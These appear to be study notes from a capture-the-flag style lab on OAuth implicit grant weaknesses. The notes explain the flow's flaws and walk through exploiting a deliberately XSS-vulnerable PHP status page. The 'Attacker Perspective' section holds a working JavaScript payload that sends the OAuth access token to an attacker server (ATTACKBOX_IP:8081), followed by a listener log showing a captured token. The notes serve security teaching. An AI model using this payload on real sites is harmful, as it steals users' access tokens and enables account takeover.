In the implicit grant flow, tokens are directly returned to the client via the browser without requiring an intermediary authorization code. This flow is primarily used by single-page applications and is designed for public clients who cannot securely store client secrets. However, this flow has inherent vulnerabilities:

Weaknesses
- **Exposing Access Token in URL**: The application redirects the user to the OAuth authorization endpoint, which returns the access token in the URL fragment. Any script running on the page can easily access this fragment.
- **Inadequate Validation of Redirect URIs**: The OAuth server does not adequately validate the redirect URIs, allowing potential attackers to manipulate the redirection endpoint.
- **No HTTPS Implementation**: The application does not enforce HTTPS, which can lead to token interception through man-in-the-middle attacks.
- **Improper Handling of Access Tokens**: The application stores the access token insecurely, possibly in `localStorage` or `sessionStorage`, making it vulnerable to XSS attacks

## Deprecation of Implicit Grant Flow
Due to these vulnerabilities, the [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics) recommends deprecating the implicit grant flow in favour of the authorization code flow with [Proof Key for Code Exchange](https://auth0.com/docs/get-started/authentication-and-authorization-flow/authorization-code-flow-with-pkce) (PKCE). This updated flow provides enhanced security by mitigating the risks of token exposure and lack of client authentication.

## Example
In the attached VM, visit `http://factbook.thm:8080`, where you will see a page that allows you to sync your statuses from a `CoffeeShopApp`. The authorisation process will start once you click on the "**Sync Statuses from CoffeeShopApp**" button. The client application is configured to use the **implicit grant type**, which means the access token will be directly returned to the client. The authorization URL is constructed as follows:

```php
var client_id = 'npmL7WDiRoOvjZoGSDiJhU2ViodTdygjW8rdabt7'; 
var redirect_uri = 'http://factbook.thm:8080/callback.php'; 
var auth_url = "http://coffee.thm:8000/o/authorize/"; 
var url = auth_url + "?response_type=token&client_id=" + client_id + "&redirect_uri=" + encodeURIComponent(redirect_uri); window.location.href = url;
```

## Victim Perspective
Once the user authenticates using the OAuth provider credentials `victim:victim123`, he will be redirected to `callback.php`, where he can enter a status. This page includes a form for entering a status and submitting it via an AJAX request:
```php
<button class="btn btn-primary" onclick="submitStatus()">Submit</button>
<h2 class="mt-4">Submitted Status</h2>
<ul class="list-group" id="status-list">
    <?php
    session_start();
    if (isset($_POST['status'])) {
        $status = $_POST['status'];
        if (!isset($_SESSION['statuses'])) {
            $_SESSION['statuses'] = [];
        }
        $_SESSION['statuses'][] = $status;
        header('Content-Type: application/json');
        echo json_encode(['status' => $status]);
        exit();
    }
    // Display previously stored statuses
    if (isset($_SESSION['statuses'])) {
        foreach ($_SESSION['statuses'] as $status) {
            echo '<li class="list-group-item">' . $status . '</li>';
        }
    }
    ?>
</ul>
```

For demonstration purposes, the status input field is vulnerable to XSS. Once you reach the status page and enter a status like "**Hello**", it will be published. However, if an attacker exploits this vulnerability, they can inject a malicious script.
	![](Pasted%20image%2020241202010128.png)

## Attacker Perspective
To prepare for the attack, inside the Attackbox instance, run a Python HTTP server to listen on port `8081` using the command `python3 -m http.server 8081`. The attacker will share the following payload with the victim that he will enter as status (assume using social engineering):
```javascript
<script>
	var hash = window.location.hash.substr(1);var result = hash.split('&').reduce(function (res, item) {var parts = item.split('=');res[parts[0]] = parts[1];
    return res;
  }, {});
  var accessToken = result.access_token;
    var img = new Image();
    img.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + accessToken;
</script>
```

**Let's dissect the payload:**
- The JavaScript payload starts by extracting the fragment identifier from the URL, which is the part of the URL following the `#` symbol. It removes the leading `#` using `substr(1)` to obtain the raw fragment string.
- This string is then split by `&` to separate the individual key-value pairs. The `reduce` function processes each of these pairs, splitting them further by `=` to isolate the keys and values. These key-value pairs are then stored in an object called result.
- The script extracts the `access_token` value from this object and assigns it to the variable `accessToken`. To exfiltrate this access token, the script creates a new Image object and sets its `src` attribute to a URL that points to an attacker's server (`http://ATTACKBOX_IP:8081/steal_token`), appending the access token as a query parameter.
- When the image is loaded, it triggers a request to the attacker's server with the stolen access token included in the URL, effectively sending the token to the attacker.

Copy and paste the code inside the victim machine into the status input field. Once the victim refreshes the page, the XSS payload is executed. It copies the access token from the URL fragment and sends it to the attacker's server at `http://{ATTACKBOX_IP}:8081/steal_token`. The attacker can then capture the token and use it to gain unauthorized access to the user's account.
	![](Pasted%20image%2020241202012117.png)

```shell-session
root@ip-10-10-162-175:~# python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.9.2.217 - - [27/Aug/2024 19:30:10] code 404, message File not found
10.9.2.217 - - [27/Aug/2024 19:30:10] "GET /steal_token?token=2aauviER3lUOev8wNmXQ9B4GNUoadE HTTP/1.1" 404 -
```
![](Pasted%20image%2020241202012236.png)

The implicit grant type is particularly vulnerable to such attacks because the access token is exposed in the URL fragment, making it accessible to any script running on the page. This vulnerability is compounded if the application does not enforce HTTPS, leading to potential token interception through man-in-the-middle attacks.


